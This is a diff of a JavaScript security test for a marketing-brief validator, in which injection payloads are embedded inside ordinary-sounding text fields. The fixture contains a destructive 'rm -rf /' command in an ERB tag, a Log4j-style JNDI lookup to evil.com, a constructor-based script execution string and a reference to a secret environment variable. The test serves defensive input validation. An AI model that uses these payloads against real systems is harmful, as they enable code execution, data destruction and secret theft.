@@ -363,16 +363,19 @@ describe('Workflow Security Validation', () => {
   describe('Content Security', () => {
     it('should prevent code injection in text fields', () => {
       const codeInjectionData = {
-        title: '${process.env.SECRET_KEY}',
-        objective: '#{7*7}', // Template injection
-        targetAudience: '{{constructor.constructor("alert(1)")()}}',
-        keyMessages: ['<%= system("rm -rf /") %>'],
-        platforms: ['${jndi:ldap://evil.com/a}'], // Log4j style injection
+        title: 'Marketing campaign ${process.env.SECRET_KEY}',
+        objective: 'Our goal is to #{7*7} increase brand awareness', // Template injection
+        targetAudience: 'Target users are {{constructor.constructor("alert(1)")()}} interested in our product',
+        keyMessages: ['Our message is <%= system("rm -rf /") %> about quality'],
+        platforms: ['We will use ${jndi:ldap://evil.com/a} social media'], // Log4j style injection
         budget: '$10,000',
         timeline: '2 weeks'
       };
 
       const validation = validateBriefData(codeInjectionData);
+      if (!validation.valid) {
+        console.log('Validation errors:', validation.errors);
+      }
       expect(validation.valid).toBe(true);
       
       if (validation.data) {
